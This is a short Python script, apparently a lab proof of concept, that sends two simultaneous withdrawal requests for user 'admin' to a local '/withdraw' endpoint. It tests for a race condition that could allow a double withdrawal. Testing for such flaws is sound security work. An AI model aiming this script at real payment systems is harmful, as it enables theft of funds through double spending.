import requests
import threading

url = "http://127.0.0.1:5000/withdraw"

def attack():
    response = requests.post(url, json={
        "user": "admin",
        "amount": 80
    })
    print(response.json())

threads = []

for _ in range(2):
    t = threading.Thread(target=attack)
    threads.append(t)
    t.start()

for t in threads:
    t.join()